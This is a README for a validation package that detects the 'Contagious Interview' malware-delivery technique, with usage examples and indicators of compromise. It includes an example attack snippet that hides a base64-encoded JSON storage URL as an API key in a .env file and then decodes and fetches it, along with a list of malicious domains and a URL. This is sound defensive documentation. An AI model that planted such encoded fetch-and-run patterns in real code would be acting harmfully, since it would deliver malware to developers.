# Security Validators - Contagious Interview Attack Detection

## Overview

The validation package includes security validators to detect and prevent the **Contagious Interview** campaign attack vector that uses base64-encoded JSON storage service URLs for malware delivery.

**Reference:** [NVISO Labs - Contagious Interview Actors Now Utilize JSON Storage Services for Malware Delivery](https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/) (November 13, 2025)

## Attack Pattern

The Contagious Interview campaign targets software developers through fake job interviews. Attackers:

1. Send trojanized "demo projects" via GitLab/GitHub
2. Embed base64-encoded JSON storage URLs in config files (masquerading as API keys)
3. Code fetches and executes obfuscated malware from JSON storage services
4. Delivers BeaverTail infostealer and InvisibleFerret RAT

### Example Attack

```typescript
// Attacker puts this in .env file:
API_KEY=aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0

// Victim's code:
const apiKey = process.env.API_KEY;  // Gets base64 string
const url = atob(apiKey);  // Decodes to: https://jsonkeeper.com/b/GNOX4
fetch(url);  // Fetches obfuscated malware
```

## Automatic Detection

Security validation is **automatically enabled** for all string validations:

```typescript
import { ValidationUtils } from '@entropy-tamer/reynard-validation';

// Automatically detects base64-encoded JSON storage URLs
const result = ValidationUtils.validateValue(
  'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0',
  { type: 'string' },
  { fieldName: 'API_KEY' }
);

console.log(result.isValid);  // false
console.log(result.errors);   // ["API_KEY contains a base64-encoded JSON storage URL matching a known malicious IOC..."]
```

### Disable Security Checks

If you need to disable security checks for specific validations:

```typescript
const result = ValidationUtils.validateValue(
  value,
  { 
    type: 'string',
    securityCheck: false  // Disable security validation
  },
  { fieldName: 'API_KEY' }
);
```

## Manual Security Validation

### Detect Base64-Encoded JSON Storage URLs

```typescript
import { SecurityValidators } from '@entropy-tamer/reynard-validation';

const errors: string[] = [];
const schema = { type: 'string' };

SecurityValidators.detectBase64JsonStorageUrl(
  'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0',
  'API_KEY',
  errors,
  schema
);

if (errors.length > 0) {
  console.log('Security threat detected:', errors[0]);
}
```

### Validate Config File Content

```typescript
import { ValidationUtils } from '@entropy-tamer/reynard-validation';

const configContent = `
API_KEY=aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0
DATABASE_URL=postgresql://localhost/db
`;

const result = ValidationUtils.validateConfigFileSecurity(configContent, {
  strict: true  // Fail validation on any threat
});

if (!result.isValid) {
  console.log('Security threats found:');
  result.errors?.forEach(error => console.log(`  - ${error}`));
}
```

### Check Individual Functions

```typescript
import { SecurityValidators } from '@entropy-tamer/reynard-validation';

// Check if string is base64-encoded
const isBase64 = SecurityValidators.isBase64Encoded('aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0');

// Decode base64 string
const decoded = SecurityValidators.decodeBase64('aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0');
// Returns: 'https://jsonkeeper.com/b/GNOX4'

// Check if URL is JSON storage service
const isJsonStorage = SecurityValidators.isJsonStorageUrl('https://jsonkeeper.com/b/GNOX4');

// Check if URL matches known malicious IOC
const isMalicious = SecurityValidators.isKnownMaliciousUrl('https://jsonkeeper.com/b/GNOX4');

// Combined check
const isKnownMalicious = SecurityValidators.isKnownMaliciousJsonStorage('https://jsonkeeper.com/b/GNOX4');
```

## Integration Examples

### Validate Environment Variables

```typescript
import { ValidationUtils } from '@entropy-tamer/reynard-validation';

function validateEnvConfig(env: Record<string, string>) {
  const results: Record<string, any> = {};
  
  for (const [key, value] of Object.entries(env)) {
    const result = ValidationUtils.validateValue(value, {
      type: 'string',
      // Security check is automatic
    }, {
      fieldName: key
    });
    
    results[key] = result;
    
    if (!result.isValid) {
      console.error(`❌ ${key}: ${result.error}`);
    }
  }
  
  return results;
}

// Usage
const env = {
  API_KEY: 'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dOT1g0',  // Malicious!
  DATABASE_URL: 'postgresql://localhost/db',
};

validateEnvConfig(env);
// Output: ❌ API_KEY: API_KEY contains a base64-encoded JSON storage URL matching a known malicious IOC...
```

### Validate Config Files on Load

```typescript
import { readFileSync } from 'fs';
import { ValidationUtils } from '@entropy-tamer/reynard-validation';

function loadConfigFile(filePath: string) {
  const content = readFileSync(filePath, 'utf-8');
  
  // Validate for security threats
  const securityCheck = ValidationUtils.validateConfigFileSecurity(content, {
    strict: true  // Fail on any threat
  });
  
  if (!securityCheck.isValid) {
    throw new Error(`Security threats detected in ${filePath}:\n${securityCheck.errors?.join('\n')}`);
  }
  
  // Parse config file
  return parseConfigFile(content);
}
```

### Form Validation

```typescript
import { ValidationUtils } from '@entropy-tamer/reynard-validation';

function validateApiKeyInput(value: string) {
  const result = ValidationUtils.validateValue(value, {
    type: 'string',
    required: true,
    minLength: 10,
    // Security check automatically enabled
  }, {
    fieldName: 'API Key'
  });
  
  return result;
}

// In your form component
const handleSubmit = (formData: FormData) => {
  const apiKey = formData.get('apiKey') as string;
  const result = validateApiKeyInput(apiKey);
  
  if (!result.isValid) {
    setError(result.error);
    return;
  }
  
  // Proceed with submission
};
```

## Known Malicious Indicators

### Malicious Domains

The validators detect these JSON storage service domains:

```typescript
import { MALICIOUS_JSON_STORAGE_DOMAINS } from '@entropy-tamer/reynard-validation';

console.log(MALICIOUS_JSON_STORAGE_DOMAINS);
// Set {
//   'jsonkeeper.com',
//   'www.jsonkeeper.com',
//   'jsonsilo.com',
//   'api.jsonsilo.com',
//   'npoint.io',
//   'api.npoint.io'
// }
```

### Known Malicious URLs

```typescript
import { KNOWN_MALICIOUS_URLS } from '@entropy-tamer/reynard-validation';

// Contains 32+ known malicious URLs from the research document
console.log(KNOWN_MALICIOUS_URLS.size);  // 32+
```

## Severity Levels

- **CRITICAL**: Matches known malicious IOC from Contagious Interview campaign
- **HIGH**: Base64-encoded JSON storage URL detected (suspicious pattern)

## Best Practices

### 1. Always Validate Config Files

```typescript
import { ValidationUtils } from '@entropy-tamer/reynard-validation';

// Before loading any config file
const content = readFileSync('.env', 'utf-8');
const result = ValidationUtils.validateConfigFileSecurity(content);

if (!result.isValid) {
  // Handle security threat
  console.error('Security threats detected:', result.errors);
}
```

### 2. Validate User Input

```typescript
// When accepting API keys or config values from users
const result = ValidationUtils.validateValue(userInput, {
  type: 'string',
  // Security check is automatic
}, {
  fieldName: 'Configuration Value'
});
```

### 3. Use Strict Mode for Production

```typescript
// In production, use strict mode to block threats
const result = ValidationUtils.validateConfigFileSecurity(configContent, {
  strict: true  // Fails validation on any threat
});
```

### 4. Log Security Events

```typescript
const result = ValidationUtils.validateValue(value, schema, options);

if (!result.isValid && result.errors?.some(e => e.includes('base64-encoded JSON storage'))) {
  // Log security event
  securityLogger.warn('Potential Contagious Interview attack detected', {
    field: options.fieldName,
    value: value.substring(0, 50),  // Truncate for logging
    errors: result.errors
  });
}
```

## Testing

Run the security validator tests:

```bash
cd packages/core/validation
pnpm test security-validators.test.ts
```

## Related Tools

- **Fenrir Security Testing**: `fenrir.exploits.json_storage_exploits` for comprehensive detection
- **Research Documentation**: `docs/research/security-research/contagious-interview-json-storage-malware-delivery.md`

## References

- [NVISO Labs Blog Post](https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/)
- [Palo Alto Unit 42 - Contagious Interview](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/)
- [Research Documentation](../../../../docs/research/security-research/contagious-interview-json-storage-malware-delivery.md)
